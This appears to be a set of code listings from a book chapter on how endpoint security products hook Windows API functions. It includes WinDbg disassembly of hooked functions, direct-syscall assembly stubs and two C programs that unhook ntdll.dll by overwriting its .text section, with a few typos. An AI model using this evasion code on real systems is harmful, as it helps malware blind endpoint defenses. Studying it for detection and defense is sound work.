["```\n1:004> **uf KERNEL32!SleepStub**\nKERNEL32!SleepStub:\n00007ffa`9d6fada0 48ff25695c0600  jmp    qword ptr [KERNEL32!imp_Sleep (00007ffa`9d760a10)\n\nKERNEL32!_imp_Sleep:\n00007ffa`9d760a10 d08fcc9cfa7f    ror    byte ptr [rdi+7FFA9CCCh],1\n00007ffa`9d760a16 0000            add byte ptr [rax],al\n00007ffa`9d760a18 90              nop\n00007ffa`9d760a19 f4              hlt\n00007ffa`9d760a1a cf              iretd\n```", "```\n1:005> **uf KERNEL32!SleepStub**\nKERNEL32!SleepStub:\n00007ffa`9d6fada0 e9d353febf jmp   00007ffa`5d6e0178\n00007ffa`9d6fada5 cc         int   3\n00007ffa`9d6fada6 cc         int   3\n00007ffa`9d6fada7 cc         int   3\n00007ffa`9d6fada8 cc         int   3\n00007ffa`9d6fada9 cc         int   3\n00007ffa`9d6fadaa cc         int   3\n00007ffa`9d6fadab cc         int   3\n\n1:005> u 00007ffa`5d6e0178\n00007ffa`5d6e0178 ff25f2ffffff  jmp  qword ptr [00007ffa`5d6e0170]\n00007ffa`5d6e017e cc            int  3\n00007ffa`5d6e017f cc            int  3\n00007ffa`5d6e0180 0000N         add  byte ptr [rax],al\n00007ffa`5d6e0182 0000          add  byte ptr [rax],al\n00007ffa`5d6e0184 0000          add  byte ptr [rax],al\n00007ffa`5d6e0186 0000          add  byte ptr [rax],al\n00007ffa`5d6e0188 0000          add  byte ptr [rax],al\n```", "```\n0:005> **uf poi(00007ffa`5d6e0170)**\ntrampoline64!TimedSleep\n 10 00007ffa`82881010 48895c2408     mov     qword ptr [rsp+8],rbx\n 10 00007ffa`82881015 57             push    rdi\n 10 00007ffa`82881016 4883ec20       sub     rsp,20h\n 10 00007ffa`8288101a 8bf9           mov     edi,ecx\n 10 00007ffa`8288101c 4c8d05b5840000 lea     r8,[trampoline64!'string' (00007ffa`828894d8)]\n 10 00007ffa`82881023 33c9           xor     ecx,ecx\n 10 00007ffa`82881025 488d15bc840000 lea     rdx,[trampoline64!'string' (00007ffa`828894d8)]\n 10 00007ffa`8288102c 41b930000000   mov     r9d,30h\n 10 00007ffa`82881032 ff15f8800000   call    qword ptr [trampoline64!_imp_MessageBoxW]\n 10 00007ffa`82881038 ff15ca7f0000   call    qword ptr [trampoline64!_imp_GetTickCount]\n 10 00007ffa`8288103e 8bcf           mov     ecx,edi\n 10 00007ffa`8288103e 8bd8           mov     ebx,eax\n 10 00007ffa`82881040 ff15f0a60000   call    qword ptr [trampoline64!TrueSleep]\n 10 00007ffa`82881042 ff15ba7f0000   call    qword ptr [trampoline64!_imp_GetTickCount]\n 10 00007ffa`82881048 2bc3           sub     eax,ebx\n 10 00007ffa`8288104e f00fc105e8a60000  lock xadd dword ptr [trampoline64!dwSlept],eax\n 10 00007ffa`82881050 488b5c2430     mov     rbx,qword ptr [rsp+30h]\n 10 00007ffa`82881058 4883c420       add     rsp,20h\n 10 00007ffa`8288105d 5f             pop     rdi\n 10 00007ffa`82881061 c3             ret\n```", "```\nmov r10, rcx\nmov eax, `<syscall_number>`\nsyscall\nretn\n```", "```\n0:013> **u ntdll!NtAllocateVirtualMemory**\nntdll!NtAllocateVirtualMemory\n00007fff`fe90c0b0 4c8bd1           mov r10,rcx\n00007fff`fe90c0b5 b818000000       mov eax,18h\n00007fff`fe90c0b8 f694259893fe7f01 test byte ptr [SharedUserData+0x308,1\n00007fff`fe90c0c0 7503             jne ntdll!NtAllocateVirtualMemory+0x15\n00007fff`fe90c0c2 0f05             syscall\n00007fff`fe90c0c4 c3               ret\n00007fff`fe90c0c5 cd2e             int 2Eh\n00007fff`fe90c0c7 c3               ret\n```", "```\n0:013> **u ntdll!NtAllocateVirtualMemory**\nntdll!NtAllocateVirtualMemory\n00007fff`fe90c0b0 e95340baff       jmp 00007fff`fe4b0108\n00007fff`fe90c0b5 90               nop\n00007fff`fe90c0b6 90               nop\n00007fff`fe90c0b7 90               nop\n00007fff`fe90c0b8 f694259893fe7f01 test byte ptr [SharedUserData+0x308],1\n00007fff`fe90c0c0 7503             jne ntdll!NtAllocateVirtualMemory+0x15\n00007fff`fe90c0c2 0f05             syscall 00007fff`fe90c0c4 c3               ret\n00007fff`fe90c0c5 cd2e             int 2Eh\n00007fff`fe90c0c7 c3               ret\n```", "```\nNtAllocateVirtualMemory PROC\n    mov r10, rcx\n    mov eax, 0018h\n    syscall\n    ret\nNtAllocateVirtualMemory ENDP\n```", "```\nEXTERN_C NTSTATUS NtAllocateVirtualMemory(\n    HANDLE ProcessHandle,\n    PVOID BaseAddress,\n    ULONG ZeroBits,\n    PULONG RegionSize,\n    ULONG AllocationType,\n    ULONG Protect);\n```", "```\n#include \"syscall.h\"\n\nvoid wmain()dg\n{\n    LPVOID lpAllocationStart = NULL;\n  ❶ NtAllocateVirtualMemory(GetCurrentProcess(),\n        &lpAllocationStart, 0,\n        (PULONG)0x1000,\n        MEM_COMMIT | MEM_RESERVE,\n        PAGE_READWRITE);\n}\n```", "```\nNtCreateThreadEx PROC\n    mov rax, gs:[60h] ; Load PEB into RAX.\nNtCreateThreadEx_Check_X_X_XXXX: ; Check major version.\n    cmp dword ptr [rax+118h], 10\n    je  NtCreateThreadEx_Check_10_0_XXXX\n    jmp NtCreateThreadEx_SystemCall_Unknown\n❶ NtCreateThreadEx_Check_10_0_XXXX: ;\n    cmp word ptr [rax+120h], 18362\n    je  NtCreateThreadEx_SystemCall_10_0_18362\n    cmp word ptr [rax+120h], 18363\n    je  NtCreateThreadEx_SystemCall_10_0_18363\n    cmp word ptr [rax+120h], 19041\n    je NtCreateThreadEx_SystemCall_10_0_19041\n    cmp word ptr [rax+120h], 19042\n    je NtCreateThreadEx_SystemCall_10_0_19042\n    jmp NtCreateThreadEx_SystemCall_Unknown\nNtCreateThreadEx_SystemCall_10_0_18362: ; Windows 10.0.18362 (1903)\n  ❷ mov  eax, 00bdh\n    jmp NtCreateThreadEx_Epilogue NtCreateThreadEx_SystemCall_10_0_18363: ; Windows 10.0.18363 (1909)\n    mov eax, 00bdh\n    jmp NtCreateThreadEx_Epilogue\nNtCreateThreadEx_SystemCall_10_0_19041: ; Windows 10.0.19041 (2004)\n    mov eax, 00c1h\n    jmp NtCreateThreadEx_Epilogue\nNtCreateThreadEx_SystemCall_10_0_19042: ; Windows 10.0.19042 (20H2)\n    mov eax, 00c1h\n    jmp NtCreateThreadEx_Epilogue\nNtCreateThreadEx_SystemCall_Unknown: ; Unknown/unsupported version.\n    ret\nNtCreateThreadEx_Epilogue:\n    mov r10, rcx\n  ❸ syscall\n    ret\nNtCreateThreadEx ENDP\n```", "```\nint wmain()\n{\n    HMODULE hOldNtdll = NULL;\n    MODULEINFO info = {};\n    LPVOID lpBaseAddress = NULL;\n    HANDLE hNewNtdll = NULL;\n    HANDLE hFileMapping = NULL;\n    LPVOID lpFileData = NULL;\n    PIMAGE_DOS_HEADER pDosHeader = NULL;\n    PIMAGE_NT_HEADERS64 pNtHeader = NULL;\n\n    hOldNtdll = GetModuleHandleW(L\"ntdll\");\n    if (!GetModuleInformation(\n        GetCurrentProcess(),\n        hOldNtdll,\n        &info,\n        sizeof(MODULEINFO)))\n\n  ❶ lpBaseAddress = info.lpBaseOfDll;\n\n     hNewNtdll = CreateFileW(\n         L\"C:\\\\Windows\\\\System32\\\\ntdll.dll\",\n         GENERIC_READ,\n         FILE_SHARE_READ,\n         NULL,\n         OPEN_EXISTING,\n         FILE_ATTRIBUTE_NORMAL,\n         NULL);\n\n     hFileMapping = CreateFileMappingW(\n         hNewNtdll,\n         NULL,\n         PAGE_READONLY | SEC_IMAGE,\n         0, 0, NULL);\n\n  ❷ lpFileData = MapViewOfFile(\n         hFileMapping,\n         FILE_MAP_READ,\n         0, 0, 0);\n\n    pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;\n    pNtHeader = (PIMAGE_NT_HEADERS64)((ULONG_PTR)lpBaseAddress + pDosHeader->e_lfanew); for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++)\n    {\n        PIMAGE_SECTION_HEADER pSection =\n            (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(pNtHeader) +\n            ((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));\n\n      ❸ if (!strcmp((PCHAR)pSection->Name, \".text\"))\n       {\n           DWORD dwOldProtection = 0;\n         ❹ VirtualProtect(\n               (LPVOID)((ULONG_PTR)lpBaseAddress + pSection->VirtualAddress),\n               pSection->Misc.VirtualSize,\n               PAGE_EXECUTE_READWRITE,\n               &dwOldProtection\n           );\n\n         ❺ memcpy(\n               (LPVOID)((ULONG_PTR)lpBaseAddress + pSection->VirtualAddress),\n               (LPVOID)((ULONG_PTR)lpFileData + pSection->VirtualAddress),\n               pSection->Misc.VirtualSize\n           );\n\n         ❻ VirtualProtect(\n               (LPVOID)((ULONG_PTR)lpBaseAddress + pSection->VirtualAddress),\n               pSection->Misc.VirtualSize,\n               dwOldProtection,\n               &dwOldProtection\n           );\n\n           break;\n        }\n    }\n\n    `--snip--`\n}\n```", "```\nint wmain() {\n    LPVOID pNtdll = nullptr;\n    MODULEINFO mi;\n    STARTUPINFOW si;\n    PROCESS_INFORMATION pi;\n    ZeroMemory(&si, sizeof(STARTUPINFOW));\n    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));\n\n    GetModuleInformation(GetCurrentProcess(),\n        GetModuleHandleW(L\"ntdll.dll\"),\n      ❶ &mi, sizeof(MODULEINFO));\n\n    PIMAGE_DOS_HEADER hooked_dos = (PIMAGE_DOS_HEADER)mi.lpBaseOfDll;\n    PIMAGE_NT_HEADERS hooked_nt =\n      ❷ (PIMAGE_NT_HEADERS)((ULONG_PTR)mi.lpBaseOfDll + hooked_dos->e_lfanew);\n\n    CreateProcessW(L\"C:\\\\Windows\\\\System32\\\\notepad.exe\",\n        NULL, NULL, NULL, TRUE, CREATE_SUSPENDED,\n      ❸ NULL, NULL, &si, &pi);\n\n  pNtdll = HeapAlloc(GetProcessHeap(), 0, mi.SizeOfImage);\n  ReadProcessMemory(pi.hProcess, (LPCVOID)mi.lpBaseOfDll,\n      pNtdll, mi.SizeOfImage, nullptr);\n\n  PIMAGE_DOS_HEADER fresh_dos = (PIMAGE_DOS_HEADER)pNtdll;\n  PIMAGE_NT_HEADERS fresh_nt =\n     4 (PIMAGE_NT_HEADERS)((ULONG_PTR)pNtdll + fresh_dos->e_lfanew);\n\n  for  (WORD i = 0; i < hooked_nt->FileHeader.NumberOfSections; i++) {\n        PIMAGE_SECTION_HEADER hooked_section =\n            (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(hooked_nt) +\n                ((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));\n\n        if (!strcmp((PCHAR)hooked_section->Name, \".text\")){\n            DWORD oldProtect = 0;\n            LPVOID hooked_text_section = (LPVOID)((ULONG_PTR)mi.lpBaseOfDll +\n                (DWORD_PTR)hooked_section->VirtualAddress);\n\n            LPVOID fresh_text_section = (LPVOID)((ULONG_PTR)pNtdll +\n                (DWORD_PTR)hooked_section->VirtualAddress); VirtualProtect(hooked_text_section,\n                hooked_section->Misc.VirtualSize,\n                PAGE_EXECUTE_READWRITE,\n                &oldProtect);\n\n            RtlCopyMemory(\n                hooked_text_section,\n                fresh_text_section,\n                hooked_section->Misc.VirtualSize);\n\n            VirtualProtect(hooked_text_section,\n                hooked_section->Misc.VirtualSize,\n                oldProtect,\n                &oldProtect);\n        }\n    }\n    TerminateProcess(pi.hProcess, 0);\n\n    `--snip--`\n\n    return 0;\n}\n```"]